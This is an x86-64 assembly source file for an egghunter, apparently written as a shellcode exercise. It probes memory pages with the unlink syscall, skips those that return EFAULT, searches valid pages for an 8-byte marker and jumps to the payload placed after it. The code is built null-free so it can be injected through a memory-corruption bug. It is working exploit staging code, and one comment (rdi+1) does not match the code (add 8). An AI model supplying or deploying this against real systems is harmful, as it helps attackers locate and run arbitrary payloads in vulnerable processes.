global _start

section .text

_start:
    xor rdi,rdi                 ;start at page with addr: 0x00
    push rdi                    ;throughout the search we'll keep rdi in the stack across JMPs
    jmp seek                    ;start seeking

next_page:
    pop rdi                      ;grab rdi from stack (we do this because SCASQ changes rdi)
    or di,0xfff                  ;to avoid \x00 we'll OR the lower RDI bites and then inc 1 to look at next page
    inc rdi                      ;inc 4095 (next mem page)

seek:
    xor rcx,rcx                 ;clear our loop counter
    xor rax,rax                 ;clear RAX
    add al, 87                  ;unlink syscall
    syscall                     ;exec syscall to check if mem page is valid
    cmp al, 0xf2                ;Did the syscall return an EFAULT?
    push rdi                    ;Save current RDI for later
    mov cx,0xffe                ;Let's prepare the counter for in_page_search 
    je next_page                ;If an EFAULT was triggered move to next page
                                ;else execution falls to next instruction (in_page_search)

in_page_search:
    xor rax,rax                 ;clear rax
    mov rax,0x7367676573676764  ;We are looking for this signature (LittleEndian) +1
    inc rax                     ;inc signature by 1 (to avoid our search pattern finding itself)
    push rdi                    ;save current rdi for lated just before it gets modified by scasq
    scasq                       ;compare value in RAX to value in *rdi
    pop rdi                     ;restore correct rdi after it has been modified by scasq
    je exec_shellcode           ;If scasq found a match, jump to it
    inc rdi                     ;else increment rdi 
    loop in_page_search         ;and go back to searching in the page
    jmp seek                    ;if we searched the entire page, go to next page


exec_shellcode:
    add rdi,8                   ;actual shellcode will be at rdi+1 (we need to skip the signature as it's not real code)
    jmp rdi                     ;jmp to main payload




